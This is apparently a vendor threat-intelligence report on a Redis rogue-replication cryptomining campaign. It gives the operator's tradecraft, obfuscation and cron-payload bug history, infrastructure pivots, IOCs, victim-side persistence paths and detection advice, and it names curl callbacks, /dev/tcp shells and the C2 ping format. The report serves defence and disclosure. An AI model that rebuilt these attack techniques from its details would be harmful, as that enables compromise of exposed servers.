+.  exploit_wp.py and extract_hosts.py write every string constant as a chain of chr(N) calls instead of a plain literal, the marker "CRON_INJECTED" that extract_hosts.py uses to pull confirmed victims out of the campaign logs, for instance, is chr(67)+chr(82)+chr(79)+chr(78)+.... It defeats naive substring or keyword signature matching while leaving the control flow perfectly readable to a human, or to anyone who bothers to decode it.
+Iterative, self-documented development
+. The verification payloads exist in at least three generations, and each one carries a comment forward explaining what the last one got wrong:
+Figure 18. Two generations of bugfix comments, the dotfile-skip bug and the /dev/tcp shell-compatibility bug, left in place as documentation.
+The first generation writes its test cron entry to a dot-prefixed filename, /etc/cron.d/.verify, and the fix flags a real bug: that payload would have been silently ignored on every affected host, because the run-parts-style scanner behind cron.d skips dotfiles by convention. The second fix notes that the original SIMPLE_CMD leaned on bash's /dev/tcp pseudo-device for a raw socket write, but cron's default shell on Debian/Ubuntu (/bin/sh, symlinked to dash) doesn't implement /dev/tcp at all, so every generation-1 payload on a Debian-family cron would have failed silently at the very first shell command, before it ever reached the curl callback.
+Both of those bugs show up in the campaign data, too: the verification technique only got reliable enough to tell real cron execution from silent no-ops once generation 2 was in play, and generation 2's logic, per-host key writes plus callback pings, is what underlies the cron_verify checks running through the toolkit's later, fleet-scale scripts.
+Operator Tradecraft Assessment
+Operating environment (high confidence)
+. The batch scripts reference paths like C:\Users\ContainerUser\campaign\c2_persist.db and C:\host_public\python311..., and the toolkit ships its own portable Python 3.11 rather than leaning on a system interpreter. Two files, SAM.save and SYSTEM.save, checked out as genuine exported Windows registry hives on byte-level signature inspection (the regf magic header).
+That inference gets backed up by something more direct: rogue_result.txt, a live log from one of the fileless runs, records SLAVE_ERR:
+34.166.29[.]49
+:[WinError 10054] An existing connection was forcibly closed by the remote host. WinError codes only come from Windows' native socket stack, so this is a runtime artifact of the operator's own process, not an inference off a file path.
+Assessment
+: the operator is on a Windows host, most likely inside a Docker container given the ContainerUser account name, and the exposed directory is that host's own working directory, doing triple duty as attack tooling, C2 data store, and web root. That rests on three independent lines of evidence, file-path conventions, real registry-hive exports, and a live Windows-specific runtime error, not any single one of them.
+Development discipline (medium-to-high confidence)
+. Underscore-prefixed scratch files, inline bugfix comments, and a small set of dedicated test targets all point to someone who iterates on and debugs their own tooling rather than running a static kit off the shelf.
+And the test set is more than one host:
+47.250.92.230
+is the most-reused QA target (hardcoded across deploy_all.py, cron_multi_test.py, lua_test.py, redis_info.py/redis_info2.py/redis_info3.py, redis_paths2.py/redis_paths3.py, and redis_bgsave_test.py), but a reset utility, diag.py.b64, targets five hosts at once (
+34.166.99.116
+,
+20.198.10.42
+,
+213.6.207.123
+,
+173.212.244.25
+, and
+47.250.92.230
+), which tells us they kept a small dev/test pool rather than a single box, and hands us two IOCs (
+213.6.207.123
+,
+173.212.244.25
+) that show up nowhere else in the toolkit.
+We treat these as the operator's dev/test pool because of how the tooling uses them, repeatedly, as hardcoded single targets across QA scripts, but the recovered files don't establish who owns them. They could be boxes the operator rented and stood up, or third-party hosts the operator was testing against. I can't tell which from this evidence, so I'm listing them as observed test targets, not as confirmed operator-owned infrastructure.
+Monetization discipline (high confidence)
+. Reusing the same wallet between the botnet payloads and the operator's own local miner is a direct, unambiguous link, a choice that trades opsec for the convenience of not juggling wallets.
+Infrastructure Analysis
+Running passive infrastructure enrichment against every IP in the toolkit turned up a few things worth pulling out: a correction to the exposure window, one indicator that's independently corroborated, a geographic outlier, and one finding big enough to change the scope of this whole report, a second, earlier, and completely different open directory tied to the same operator by wallet reuse.
+A second open directory, four months earlier, on different infrastructure, run by the same wallet holder
+. Searching Hunt.io's AttackCapture corpus for the exact Monero wallet string hardcoded throughout this toolkit returns eleven hits. Nine are files already covered here. The other two point somewhere we hadn't seen:
+194.48.248[.]105
+:8081 (AS200019, currently registered to OvO Systems Ltd., Chisinau, Moldova), first indexed
+2026-02-23
+, about four months before the Redis toolkit surfaced at
+188.245[.]99.156
+. Here's everything in that directory:
+Figure 19. AttackCapture's file listing for
+194.48.248[.]105
+:8081, nine files, 11.4 KB, all flagged as malicious.
+File
+Purpose
+deploy_meterpreter.sh
+Downloads and installs meterpreter.elf, with cron, systemd, and rc.local persistence
+meterpreter.elf
+The Meterpreter payload binary itself
+deploy_miner.sh, deploy_miner_real_v2.sh
+Early generation: downloads ccminer, points at
+xmr.pool.minergate.com
+:45700
+deploy_miner_real.sh, deploy_miner_real_cpu.sh, deploy_miner_real_v3.sh (plus a .bak copy)
+Later generation: downloads real XMRig from GitHub, targets both x86_64 and aarch64, tests multiple pools with fallback logic, same cron/systemd/rc.local persistence, hardcoded with the identical wallet address used throughout the June campaign
+test.sh
+A one-line benign test script (touch /tmp/test_deploy)
+Assessment
+: this is a genuinely different toolkit from the one this report otherwise documents, every file is a Linux shell script, not Python, and nothing references Redis at all. It has its own evolution baked in, an early ccminer/MinerGate generation replaced by a hardened multi-architecture XMRig one, the same iterate-and-harden rhythm we keep pointing at in the June toolkit.
+The Meterpreter payload sitting next to the miner deployers says the capability here goes past cryptomining, though nothing in the directory reveals how they got in, it's all post-compromise deployment, not exploit code. Wallet reuse is a strong link to the June campaign, but the same caveat holds as everywhere else: it proves common monetization, not that one person wrote both toolkits.
+Taken at face value, this pushes the operator's earliest known activity back to at least February 2026, roughly five months before this investigation started, and makes clear the June campaign is one visible slice of something longer-running rather than an isolated incident.
+The exposure ran longer than the directory timestamps alone suggested
+. Hunt.io's own AttackCapture crawl history for
+188.245[.]99.156
+has the directory first indexed at 2026-06-21 04:41:44 UTC and last confirmed live at
+2026-06-27 09:04:03 UTC
+, a six-day window rather than the four days the file timestamps imply. The crawl also counted 178 files at index time against the 147 in our local copy, most likely files added, removed, or skipped between the first crawl and the later manual pull rather than a real discrepancy.
+The crawler's own tagging flagged the directory coinminer, xmrig, and MITRE T1012/T1082/T1124/T1217, the same generic discovery tags it also stuck on an unrelated Google Chrome.lnk shortcut, a good reminder those tags come from the platform's classifier, not from anything confirmed against the miner.
+188.245[.]99.156
+is a Hetzner dedicated server, not throwaway bulletproof hosting
+. ASN AS24940 (Hetzner Online GmbH, Nuremberg, Germany), standard
+your-server.de
+PTR, no TOR, proxy, or VPN flags. This is a rented dedicated box on a mainstream European provider, not disposable shared infrastructure, which fits an operator who wants a stable, long-lived home for a C2 process and rogue Redis listeners that have to stay reachable across a multi-day campaign.
+The mining pool is independently confirmed by an unrelated campaign
+.
+pool.moneroocean[.]stream
+(registered 2017-08-11 via Porkbun) carries two IOC Hunter sightings from 24 July 2026, both from reporting on a malicious RubyGems supply-chain campaign ("Malicious RubyGems Turn Developer Machines Into Monero Miners and Spread Through SSH") that used the same pool for XMRig payouts.
+Assessment
+: this doesn't tie the two campaigns to one operator, MoneroOcean is a public, no-registration pool and cross-campaign reuse is exactly what you'd expect. What it does do is independently confirm, from a source with no connection to this investigation, that this pool was actively handling XMRig payouts for malicious campaigns in the same window our operator was using it.
+Figure 20. Hunt.io's domain profile for
+pool.moneroocean.stream
+, showing the two RubyGems-campaign IOC sightings.
+Correction: '
+socket.ayakliborsa[.]net
+' is live operator infrastructure, not a stale pivot
+. A follow-up pass against DNS and certificate history flips our earlier read on this hostname. Hunt.io's DNS history has its A record pointed at
+188.245[.]99.156
+continuously from
+2026-01-12 through 2026-07-25
+, the day we ran this pass, a full month past the directory's own last-confirmed-live date.
+Three consecutive Let's Encrypt certificates for this exact hostname show up on port 8081, spanning 2026-01-13 to 2026-06-25, two days before the crawler last confirmed the open directory live. The domain was registered 2024-10-19 through Realtime Register B.V. on privacy-redacted WHOIS, on
+alastyr.com
+nameservers.
+Assessment
+: the *.
+scalefast[.]ninja
+certificate that originally led us to a "prior tenant" read genuinely is stale, it stops after September 2024 and never comes back, so that part of the first call was right. But
+socket.ayakliborsa[.]net
+itself isn't stale, it's current, operator-controlled infrastructure that outlived this report's own June 2026 window. That replaces our earlier "likely dead end" conclusion.
+Figure 21. DNS history for
+socket.ayakliborsa.net
+, an unbroken A record to
+188.245[.]99.156
+from January 2026 through the day of this pass.
+We verified this straight against Hunt.io's certificate index rather than trusting a summary view:
+SELECT
+ip,
+  port,
+  hostnames,
+timestamp
+FROM
+certificates.inventory
+WHERE
+hostnames
+LIKE
+'%ayakliborsa%'
+ORDER
+BY
+timestamp
+DESC
+LIMIT
+50
+Copy
+Figure 22. Raw query result, every hit is
+188.245[.]99.156
+:8081, confirming the hostname has never been resolved anywhere else.
+The domain's registration history adds one more wrinkle:
+ayakliborsa.net
+passed through at least four different nameserver providers (Newfold, a Turkish host, Confluence Networks, Microsoft) before landing on
+alastyr.com
+around its October 2024 re-registration, which is ordinary churn for a previously-expired domain rather than a signal on its own.
+Figure 23. Nameserver history for the
+ayakliborsa.net
+apex domain.
+The same IP independently backs up the "Windows host behind a container" read, this time from live telemetry instead of file paths
+. A self-signed RDP certificate for hostname WIN-F13ECU568VF shows up on port 3389 continuously from June 2025 through January 2026, over a year ahead of the June 2026 campaign, which fits the operator's own remotely-accessed Windows server rather than some transient artifact.
+Separately, a certificate issued by swarm-ca, the internal CA Docker mints for Swarm-mode clusters, appears on port 2377, Docker Swarm's cluster-management port, between September and November 2025. That's a good deal more specific than the ContainerUser path string alone gave us, and it comes from infrastructure telemetry that's independent of the recovered files.
+Figure 24. The full pivot list for
+188.245[.]99.156
+: the swarm-ca issuer and the stale *.
+scalefast.ninja
+certificate both visible alongside the live JARM fingerprints.
+SELECT
+ip,
+  port,
+  subject.common_name
+AS
+subject_cn,
+  issuer.common_name
+AS
+issuer_cn,
+timestamp
+FROM
+certificates.inventory
+WHERE
+subject.common_name
+=
+'WIN-F13ECU568VF'
+AND
+timestamp
+gt
+'2026-01-01'
+ORDER
+BY
+timestamp
+DESC
+LIMIT
+50
+Copy
+Figure 25. All three post-2026-01-01 sightings of the WIN-F13ECU568VF RDP certificate, every one on
+188.245[.]99.156
+.
+194.48.248[.]105
+'s own certificate history shows no continuity with the June operator's naming or infrastructure
+. Its SSL record is a grab-bag of unrelated prior tenants: two 2023 self-signed certs under gaming-themed hostnames (pubg-gaurav-3, wingsaven11047), a 2024 dynamic-DNS cert for
+praline.freemyip.com
+, and a March 2026 self-signed proxy.local. None of it overlaps the ayakliborsa/Hetzner pattern above, which reinforces, with direct evidence rather than an absence of it, that wallet reuse links the two directories by monetization, not by shared infrastructure or a confirmed single identity.
+Figure 26. Full certificate history for
+194.48.248[.]105
+, unrelated gaming and dynamic-DNS hostnames with no overlap to the operator's naming pattern.
+Two negative results, for completeness
+. No IOC Hunter report tags
+188.245[.]99.156
+directly, the only external corroboration is still the shared mining pool. And the string ayakliborsa never appears inside the operator's own recovered files, the hostname is purely infrastructure-level, never referenced in their code. The pinned XMRig TLS fingerprint from the latest payload variant also isn't a CT-logged public certificate, which fits a self-issued or private pool cert pin.
+The secondary infrastructure has no threat-intel footprint of its own, and spans a genuinely mixed set of providers
+. Every other IP in the toolkit came back clean, no malicious open directories, no malware associations, no IOC Hunter sightings, each on a distinct hosting fingerprint:
+IP
+ASN / Provider
+Location
+Role in this campaign
+45.155[.]102.89
+AS57043, HOSTKEY B.V.
+Frankfurt, Germany
+Operator's self-mining pool/proxy
+47.250[.]92.230
+AS45102, Alibaba Cloud
+Kuala Lumpur, Malaysia
+Observed QA/test target (ownership unconfirmed)
+34.166[.]99.116
+AS396982, Google LLC (GCP)
+Dammam, Saudi Arabia
+Lua sandbox-probe target
+20.198[.]10.42
+AS8075, Microsoft (Azure)
+Pune, India
+Lua sandbox-probe target
+213.6[.]207.123
+AS12975, PALTEL (ISP, not hosting)
+Nablus, West Bank
+diag.py.b64 reset-utility target
+173.212[.]244.25
+AS51167, Contabo GmbH
+Lauterbourg, France
+diag.py.b64 reset-utility target
+23.235[.]223.49
+AS22611, InMotion Hosting
+Los Angeles, US
+Recurring WordPress exploitation target
+Assessment
+: four of the seven secondary hosts sit on major cloud platforms (Alibaba Cloud, Google Cloud, Azure, plus the budget European VPS provider Contabo), which reads like an operator testing against whatever cloud instances happened to be reachable rather than deliberately picking a provider.
+213.6[.]207.123
+is the odd one out, it resolves to a Palestinian telecom ISP (PALTEL), not a hosting or cloud provider, so it's very likely a real end-user or small-business connection rather than something the operator stood up. Why it sits in the same diag.py.b64 reset-utility target list as the clearly cloud-hosted QA boxes, the files don't say, and we can't tell from this evidence whether it's an incidental scan target, a real if minor victim, or just a mistake in the operator's own tooling.
+Indicators of Compromise
+Network indicators
+Indicator
+Type
+Role
+188.245[.]99.156
+IP
+Operator host --- rogue Redis endpoint, C2, payload staging
+188.245[.]99.156
+:10000
+IP:port
+C2 callback endpoint
+188.245[.]99.156
+:16379--16385
+IP:port range
+Rogue Redis replication ports
+45.155[.]102.89
+:10128
+IP:port
+Local mining pool/proxy used by the operator's own host
+pool.moneroocean[.]stream
+:443
+Domain:port
+Mining pool used by botnet-deployed XMRig
+47.250[.]92.230
+IP
+Most frequently reused QA/test target (ownership unconfirmed)
+34.166[.]99.116
+,
+20.198[.]10.42
+,
+213.6[.]207.123
+,
+173.212[.]244.25
+IP
+Additional observed dev/QA targets, ownership unconfirmed (Lua probe and diag.py.b64 reset utility)
+23.235[.]223.49
+IP
+Recurring WordPress exploitation target
+194.48.248[.]105
+:8081
+IP:port
+Earlier (Feb 2026), separate open directory linked by wallet reuse; Meterpreter and shell-script XMRig deployers, no Redis component observed
+socket.ayakliborsa[.]net
+Domain
+Live operator-controlled hostname on
+188.245[.]99.156
+:8081, continuously resolving 2026-01-12 through 2026-07-25
+WIN-F13ECU568VF
+Hostname (RDP cert CN)
+Operator's own Windows host, RDP-observable on
+188.245[.]99.156
+June 2025 -- January 2026
+420c7850e09b7c2b9e39e2a93e204e3c56bcf08a685ff1daa986e3c348da5d2a
+TLS fingerprint
+Pinned pool certificate, most recent payload variant only
+Host-based indicators (victim-side)
+Path
+Purpose
+/etc/cron.d/redis-miner
+Primary cron persistence path (85% of run-1 victims)
+/etc/cron.hourly/redis-miner
+Fallback cron persistence path (15% of run-1 victims)
+/etc/cron.d/redis-update, /var/spool/cron/root, /var/spool/cron/crontabs/root
+Additional fallback paths
+/root/.ssh/authorized_keys, /home/redis/.ssh/authorized_keys, /var/lib/redis/.ssh/authorized_keys
+SSH key-injection targets
+/etc/apt/apt.conf.d/99sys-update
+APT hook persistence
+/etc/profile.d/sys-init.sh
+Login-shell persistence
+/tmp/.xmrig, /tmp/.xr
+Hidden XMRig binary path
+Detection and Mitigation Recommendations
+For Redis operators
+. The core fix is boring but total: never expose Redis to an untrusted network without requirepass, and where you aren't actively using replication, disable SLAVEOF/REPLICAOF with rename-command or turn on protected-mode, either one removes the primitive this whole campaign rides on. On the detection side, audit /etc/cron.d/, /etc/cron.hourly/, /etc/crontab, and /var/spool/cron/ for entries referencing curl, tar, or xmrig, and treat any Redis process whose dir/dbfilename points outside its own data directory as a strong sign of prior compromise.
+One thing worth repeating: because confirmed victims ran everything from Redis 2.8.17 to 7.2.0, upgrading doesn't fix this, only configuration does. And keep the recon findings from earlier in mind, this operator's tooling also probes SysV init directories (/etc/rc0.d-/etc/rc6.d, /etc/init.d) and /etc/modprobe.d, even if no production payload against them turned up. A thorough compromise review shouldn't stop at the four paths confirmed in production.
+For SSH hardening
+. The recovered SSH-injection technique targets authorized_keys under service-account home directories, not just /root/.ssh, so pair key-based auth with AuthorizedKeysCommand restrictions or file-integrity monitoring on those paths, whether or not you think Redis is in play.
+For WordPress operators
+. Weak or default admin credentials are the single hinge the whole targeted-takeover chain depends on, so enforce strong unique passwords, disable XML-RPC where you don't need it, and watch for repeated auth attempts against wp-login.php and xmlrpc.php from one source. Any unexpected plugin-installation activity, or a single-file PHP script showing up in uploads or plugins with system(), exec(), shell_exec(), or passthru() in it, deserves an immediate look.
+For MongoDB operators
+. This operator's escape attempt failed everywhere it ran, but the underlying exposure, a MongoDB instance that allows unauthenticated server-side JavaScript, is a real risk surface on its own. Disable server-side scripting (--noscripting) where you don't need it and the primitive goes away entirely.
+General network monitoring
+. For hosts you think are already hit, two network-layer signals are worth wiring up: outbound HTTP to
+188.245.99.156
+on port 10000 (the C2 check-in is a GET of the form
+/ping?h=<hostname>
+), and TLS connections to
+pool.moneroocean.stream
+:443 or
+45.155.102.89
+:10128.
+Conclusion
+Working from the operator's own campaign telemetry, the confirmed toll is 3,562 distinct Redis servers, from two independently coded scripts run against the same 12,966-host list. The toolkit runs four techniques across three services, but only Redis rogue replication worked at scale; the SSH-injection and MongoDB tracks came away with zero confirmed compromises across 2,810 attempts.
+The victim data spans eight years of Redis releases and Linux from EOL RHEL/CentOS 6 to current Ubuntu kernels, which fixes the weakness as a configuration failure, missing authentication, that no version bump will close. The whole picture, the campaign logs, the R&D trail, the wallet reuse, came from one exposed directory indexed while the operator was still working in it.
+That directory surfaced in Hunt.io's AttackCapture the moment it went live.
+Book a demo
+to see what AttackCapture surfaces against your own infrastructure.
